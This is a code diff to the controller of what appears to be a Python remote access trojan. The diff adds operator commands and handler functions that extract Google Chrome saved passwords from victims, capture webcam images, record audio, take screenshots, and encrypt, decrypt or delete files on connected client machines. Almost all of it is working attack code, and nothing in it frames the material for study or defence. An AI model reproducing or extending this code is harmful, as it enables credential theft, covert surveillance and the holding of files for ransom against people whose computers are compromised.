@@ -4,7 +4,7 @@ import time
 import os
 from queue import Queue
 import tqdm
-
+from datetime import datetime
 import subprocess
 import base64
 
@@ -17,59 +17,35 @@ all_connections = []
 all_addresses = []
 addr_hosts = []
 
-# COMMANDS = {'Commands':['Desscription'],
-#             'help':['Shows this help'],
-#             'list':['Lists connected clients'],
-#             'select':['Selects a client by its index. Takes index as a parameter'],
-#             'quit':['Stops current connection with a client. To be used when client is selected'],
-#             'record <filename_in_which_we_want_save> <time(sec)>':['Records sound of client till amount of time which you specified'],
-#             'screenshot <filename_in_which_we_want_save>':['Takes a screenshot of client\'s screens'],
-#             'upload <file_which_you_want_to_upload> <filename_at_client_side>':['To upload a file to client.'],
-#             'download <file_which_you_want_to_download> <filename_at_server_side>':['To download a file from client.'],
-#             'shutdown':['Shuts server down'],
-#            }
-
-COMMANDS = {"Commands":         ["Desscription"],
-            'help':             ['Show this help message'],
-            "download":         ["Download file from client machine"],
-                # :upload       Upload file to client machine
-                # :kill         Kill the connection with client machine
-                # :exec         Run external command
-                # :screenshot   Take a screenshot of the client machine
-                # :recording    Take a voice recording of the client
-                # :check        Check if client machine is connected to internet
-                # :wifi         Show Client machine wifi info [names,passwod,etc]
-                # :browse       Open an website on client machine browser
-                # :encrypt      Encrypt a file on a client machine
-                # :decrypt      Decrypt a file on a client machine
-                # pwd           Print working directory in client machine
-                # cd -          Switch back to previous directory in client machine
-                # cd --         Switch back to first directory when connection was established with client machine
+COMMANDS = {'Commands':['Description'],
+            'help':['Shows this help'],
+            'list':['Lists connected clients'],
+            'select':['Selects a client by its index. Takes index as a parameter'],
+            'quit':['Stops current connection with a client. To be used when client is selected'],
+            'record <filename_in_which_we_want_save> <time(sec)>':['Records sound of client till amount of time which you specified'],
+            'screenshot <filename in which we want save>':['Takes a screenshot of client\'s screens'],
+            'upload <file which you want to_upload>':['To upload a file to client.'],
+            'download <file which you want to download>':['To download a file from client.'],
+            'savedpass <savedpass.txt>':['To extract google chrome saved passwords and save it as the client\'s computer username'],
+            'delete <file which you want to delete>':['To delete a file from the client\'s computer'],
+            'browse <website_url e.g. youtube.com>':['Opens the client\'s ms edge and browse the website'],
+            'encrypt <filename>':['Encrypt the filename you want to encrypt and send you the salt file of the encrypted file'],
+            'decrypt <filename>':['Decrypt the filename you want to decrypt but first you need to upload the file\'s salt'],
+            'shutdown':['Shuts server down'],
            }
+
 
 def print_name():
     name = '''
-  _____     ______   _____  
- |  __ \   |  ____| |  __ \ 
- | |__) |  | |__    | |__) |
- |  _  /   |  __|   |  ___/ 
- | | \ \   | |____  | |     
- |_|  \_\  |______| |_|     
-                            
+\033[91m      
+\033[92m              # #   #    # #    #  ####  #####  #  ####  #    # 
+\033[93m             #   #  ##   # ##   # #    # #    # # #    # ##   # 
+\033[94m            #     # # #  # # #  # #    # #    # # #    # # #  # 
+\033[94m            ####### #  # # #  # # #    # #####  # #    # #  # # 
+\033[95m            #     # #   ## #   ## #    # #   #  # #    # #   ## 
+\033[96m            #     # #    # #    #  ####  #    # #  ####  #    #                             
 '''
     print(name)
-
-# def print_name():
-#     name = '''
-# \033[91m      
-# \033[92m              # #   #    # #    #  ####  #####  #  ####  #    # 
-# \033[93m             #   #  ##   # ##   # #    # #    # # #    # ##   # 
-# \033[94m            #     # # #  # # #  # #    # #    # # #    # # #  # 
-# \033[94m            ####### #  # # #  # # #    # #####  # #    # #  # # 
-# \033[95m            #     # #   ## #   ## #    # #   #  # #    # #   ## 
-# \033[96m            #     # #    # #    #  ####  #    # #  ####  #    #                             
-# '''
-#     print(name)
 
 
 
@@ -91,7 +67,7 @@ def socket_bind():
         global port
         global s
         print('Binding socket to port: ' + str(port))
-        print_name()
+        #print_name()
         s.bind((host, port))
         s.listen(5)
     except socket.error as msg:
@@ -192,6 +168,19 @@ def send_target_commands(conn):
                 elif cmd.startswith("upload"):
                     conn.send(str.encode(cmd))
                     upload_file(conn, cmd.split()[1])
+                elif cmd.startswith("encrypt"):
+                    conn.send(str.encode(cmd))
+                    password = input("Enter password for encryption: ")
+                    conn.send(str.encode(password))
+                    encrypt_file(conn, cmd.split()[1])
+                elif cmd.startswith("decrypt"):
+                    conn.send(str.encode(cmd))
+                    password = input("Enter password for encryption: ")
+                    conn.send(str.encode(password))
+                    decrypt_file(conn, cmd.split()[1])
+                elif cmd.startswith('delete'):
+                    conn.send(str.encode(cmd))
+                    delete(conn, cmd.split()[1])
                 elif cmd.startswith("browse"):
                     conn.send(str.encode(cmd))
                     browse(conn, cmd.split()[1])
@@ -201,8 +190,12 @@ def send_target_commands(conn):
                 elif cmd.startswith("record"):
                     conn.send(str.encode(cmd))
                     recording(conn, cmd.split()[1])
-
-
+                elif cmd.startswith("savedpass"):
+                    conn.send(str.encode(cmd))
+                    savedpass(conn,cmd.split()[1])
+                elif cmd.startswith("webcam"):
+                    conn.send(str.encode(cmd))
+                    webcam(conn,cmd.split()[1])
                 else:
                     conn.send(str.encode(cmd))
                     client_response = str(conn.recv(20480), 'utf-8')
@@ -212,6 +205,10 @@ def send_target_commands(conn):
         except:
             print('Connection was lost')
             break
+
+"""
+    FUNCTION TO DOWNLOAD A FILE FROM THE CLIENTS COMPUTER
+"""
 
 
 def download_file(conn, filename):
@@ -231,13 +228,90 @@ def download_file(conn, filename):
     except Exception as e:
         print('Error occurred while downloading the file:', str(e))
 
+"""
+    FUNCTION TO ENCRYPT A FILE ON THE CLIENTS COMPUTER
+"""
+
+def encrypt_file(conn, filename):
+    try:
+        conn.send(str.encode(filename))
+        response = conn.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File to encrypt not found on the client machine')
+        else:
+            print("[!] Encrypting [ {} ].....".format(filename))
+    except Exception as e:
+        print('Error occurred while encrypting the file:', str(e))
+
+
+    try:
+        print("Receiving salt file.....")
+        conn.send(str.encode(f'{filename}.salt'))
+        response = conn.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File not found on the remote server')
+        else:
+            with open(f'{filename}.salt', 'wb') as file:
+                while True:
+                    data = conn.recv(1024)
+                    if data == b'Done':
+                        print(f'{filename}.salt' + ' Received successfully')
+                        break
+                    file.write(data)
+    except Exception as e:
+        print('Error occurred while downloading the file:', str(e))
+
+"""
+    FUNCTION TO DECRYPT AN ENCRYPTED FILE ON THE CLIENTS COMPUTER 
+"""
+   
+
+def decrypt_file(conn, filename):
+    # try:
+    #     if os.path.exists(f'{filename}.salt'):
+    #         #conn.send(b'Exists')
+            
+    #         response = conn.recv(1024).decode()
+    #         if response == 'File Not Found':
+    #             print('File already exists on the remote server')
+    #         else:
+    #             with open(f'{filename}.salt', 'rb') as file:
+    #                 while True:
+    #                     data = file.read(1024)
+    #                     if not data:
+    #                         break
+    #                     conn.sendall(data)
+    #             time.sleep(0.5)
+    #             conn.send(b'Done')
+    #             print(f'{filename}.salt'+' uploaded successfully')
+    #     else:
+    #         conn.send(b'NotFound')
+    #         print('File not found on the local machine')
+    # except Exception as e:
+    #     print('Error occurred while uploading the file:', str(e))
+    try:
+        conn.send(str.encode(filename))
+        response = conn.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File to decrypt not found on the client machine')
+        else:
+            print("[!] Decrypting [ {} ].....".format(filename))
+    except Exception as e:
+        print('Error occurred while decrypting the file:', str(e))
+
+    
+"""
+    FUNCTION TO UPLOAD A FILE TO FROM THE SERVER TO THE CLIENTS COMPUTER
+"""
+   
+
 
 def upload_file(conn, filename):
     try:
         if os.path.exists(filename):
             conn.send(b'Exists')
             response = conn.recv(1024).decode()
-            if response == 'FileExists':
+            if response == 'File Not Found':
                 print('File already exists on the remote server')
             else:
                 with open(filename, 'rb') as file:
@@ -255,8 +329,25 @@ def upload_file(conn, filename):
     except Exception as e:
         print('Error occurred while uploading the file:', str(e))
 
+"""
+    FUNCTION TO DELETE ANYTHING ON THE CLIENTS COMPUTER
+"""   
+
+
+def delete(conn, filename):
+    try:
+        conn.send(str.encode(filename))
+        response = conn.recv(1024).decode()
+        if response == "FileNotFound":
+            print('File to delete doesnt exist on the client machine')
+        else:
+            print("[!] Deleting [ {} ]......".format(filename))
     except Exception as e:
-        print('Error occurred while downloading the file:', str(e))
+        print('Error occurred while deleting the file', str(e))
+
+"""
+    FUNCTION TO TAKE SCREENSHOT OF THE CLIENTS COMPUTER
+"""
 
 
 def screenshot(conn, filename):
@@ -276,6 +367,9 @@ def screenshot(conn, filename):
     except Exception as e:
         print('Error occurred while downloading the file:', str(e))
 
+"""
+    FUNCTION TO RECORD THE CLIENTS AUDIO BY ANY NUMBER OF SECONDS YOU WANT
+"""
 
 def recording(conn, filename):
     try:
@@ -296,10 +390,59 @@ def recording(conn, filename):
         print('Error occurred while downloading the file:', str(e))
 
 
+"""
+    FUNCTION TO CAPTURE THE WEBCAM OF THE CLIENTS 
+"""
+
+def webcam(conn, filename):
+    try:
+        print("Taking webcams image please wait.....")
+        conn.send(str.encode(f'{filename}.jpg'))
+        response = conn.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File not found on the remote server')
+        else:
+            with open(f'{filename}.jpg', 'wb') as file:
+                while True:
+                    data = conn.recv(1024)
+                    if data == b'Done':
+                        print('Webcam Done Successfully')
+                        break
+                    file.write(data)
+    except Exception as e:
+        print('Error occurred while downloading the file:', str(e))
+
+"""
+    FUNCTION TO EXTRACT THE CLIENTS GOOGLE PASSWORDS AND SAVING IT AS THE CLIENTS COMPUTER USERNAME.txt
+"""
+
+def savedpass(conn,filename):
+    try:
+        print("Saving google passwords.....")
+        conn.send(str.encode(filename))
+        response = conn.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File not found on the remote server')
+        else:
+            username = conn.recv(1024).decode()
+            with open(filename, 'wb') as file:
+                while True:
+                    data = conn.recv(1024)
+                    if data == b'Done':
+                        print('Passwords Extracted Successfully')
+                        break
+                    file.write(data)
+            with open(filename, 'rb') as file:
+                file_data = file.read()
+            with open(f'{username}.txt','wb') as f:
+                f.write(file_data)
+    except Exception as e:
+        print('Error occurred while downloading the file:', str(e))
 
 
-
-
+"""
+    BROWSING THE CLIENTS INTERNET FUNCTION
+"""
 
 def browse(conn,cmd):
   url = "".join(cmd.split("browse")).strip()
@@ -309,6 +452,9 @@ def browse(conn,cmd):
     print("[~] Opening [ {} ]...".format(url))
     conn.send("browse {}".format(url).encode("UTF-8"))
     print("[*] Done \n")
+
+
+
 
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
